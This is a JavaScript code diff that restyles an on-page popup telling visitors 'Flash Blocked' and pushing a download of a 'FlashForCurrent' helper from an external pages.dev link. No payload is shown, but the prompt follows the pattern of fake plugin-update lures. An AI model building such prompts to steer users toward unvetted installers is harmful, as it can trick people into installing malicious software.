@@ -293,18 +293,87 @@
     }
 
     function showPrompt() {
-        if (hasPrompted) return;
-        hasPrompted = true;
+        if (window.hasPrompted) return;
+        window.hasPrompted = true;
+
+        if (!document.getElementById('l-g-s')) {
+            const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
+            svg.id = 'l-g-s';
+            svg.style.cssText = "position:absolute;width:0;height:0;pointer-events:none;visibility:hidden;";
+            svg.innerHTML = `
+                <defs>
+                    <filter id="g-r" x="-20%" y="-20%" width="140%" height="140%">
+                        <feTurbulence type="fractalNoise" baseFrequency="0.012" numOctaves="3" seed="5" result="n" />
+                        <feGaussianBlur in="SourceAlpha" stdDeviation="10" result="b" />
+                        <feComposite in="n" in2="b" operator="in" result="m" />
+                        <feDisplacementMap in="SourceGraphic" in2="m" scale="50" xChannelSelector="R" yChannelSelector="G" result="r" />
+                        <feSpecularLighting in="b" surfaceScale="6" specularConstant="1.5" specularExponent="35" lighting-color="#fff" result="l">
+                            <fePointLight x="-150" y="-150" z="300" />
+                        </feSpecularLighting>
+                        <feComposite in="l" in2="SourceAlpha" operator="in" result="h" />
+                        <feMerge><feMergeNode in="r" /><feMergeNode in="h" /></feMerge>
+                    </filter>
+                </defs>`;
+            document.body.appendChild(svg);
+        }
+
+        const s = document.createElement('style');
+        s.innerHTML = `
+            @keyframes f-p-in {
+                0% { opacity: 0; transform: translateY(-20px) scale(0.9); }
+                100% { opacity: 1; transform: translateY(0) scale(1); }
+            }
+            @keyframes f-p-out {
+                0% { opacity: 1; transform: scale(1); }
+                100% { opacity: 0; transform: scale(0.9); }
+            }
+            .f-p-active { animation: f-p-in 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+            .f-p-closing { animation: f-p-out 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        `;
+        document.head.appendChild(s);
+
         const n = document.createElement('div');
         n.id = 'flash-prompt';
-        n.style = "position:fixed;top:20px;right:20px;background:#2c3e50;color:#ecf0f1;padding:20px;z-index:999999;font-family:sans-serif;width:280px;";
-        n.innerHTML = `
-            <div style='font-weight:bold;margin-bottom:8px;font-size:15px;'>Unable to load flash content</div>
-            <div style='font-size:13px;line-height:1.4;margin-bottom:15px;'>Please install the flash helper to view flash content on this page.</div>
-            <a href='https://flashforcurrent.pages.dev/installer' target='_blank' style='display:inline-block;background:#3498db;color:#fff;text-decoration:none;padding:8px 12px;font-size:12px;font-weight:bold;border-radius:2px;'>Download helper</a>
-            <button onclick="document.getElementById('flash-prompt')?.remove();clearInterval(fetchinterval85025);" style='display:inline-block;border:none;background:#3498db;color:#fff;text-decoration:none;padding:8px 12px;font-size:12px;font-weight:bold;border-radius:2px;'>Nah, I'm good</button>
+        n.className = 'f-p-active';
+        n.style.cssText = `
+            position: fixed; top: 20px; right: 20px; z-index: 999999;
+            font-family: 'Trebuchet MS', Verdana, sans-serif;
+            width: 230px; padding: 20px; border-radius: 20px;
+            color: #fff; box-sizing: border-box;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            backdrop-filter: brightness(0.5) blur(15px) url(#g-r);
+            -webkit-backdrop-filter: brightness(0.5) blur(15px) url(#g-r);
         `;
+
+        const b = (bg) => `
+            display: block; width: 100%; margin-top: 10px; padding: 10px;
+            border-radius: 10px; font-weight: bold; text-transform: uppercase;
+            text-decoration: none; font-size: 10px; letter-spacing: 0.5px;
+            text-align: center; cursor: pointer; box-sizing: border-box;
+            transition: transform 0.1s; border: none;
+            ${bg}
+        `;
+
+        const close = () => {
+            n.className = 'f-p-closing';
+            clearInterval(fetchinterval85025);
+            setTimeout(() => n.remove(), 300);
+        };
+
+        n.innerHTML = `
+            <div style='font-weight:bold; margin-bottom:4px; font-size:15px; color:#6eb4f2; text-shadow: 0 2px 4px rgba(0,0,0,0.3);'>Flash Blocked</div>
+            <div style='font-size:11px; line-height:1.4; margin-bottom:15px; color:rgba(255,255,255,0.9);'>Install <strong>FlashForCurrent</strong> to view content.</div>
+            <a href='https://flashforcurrent.pages.dev/downloads' target='_blank' style='${b("background:linear-gradient(#6eb4f2, #1e5799); color:#fff;")}'>Get Helper</a>
+            <button id='f-p-close' style='${b("background:rgba(255,255,255,0.15); color:#fff;")}'>Dismiss</button>
+        `;
+
         document.body.appendChild(n);
+        document.getElementById('f-p-close').onclick = close;
+        n.querySelectorAll('a, button').forEach(el => {
+            el.onmousedown = () => el.style.transform = 'translateY(1px)';
+            el.onmouseup = () => el.style.transform = 'translateY(0)';
+        });
     }
 
     window.onfocus = () => { if (isFlashMode) { syncUrl(); if (ws_stream?.readyState === 1) ws_stream.send(JSON.stringify({ type: 'get_frame' })); } };
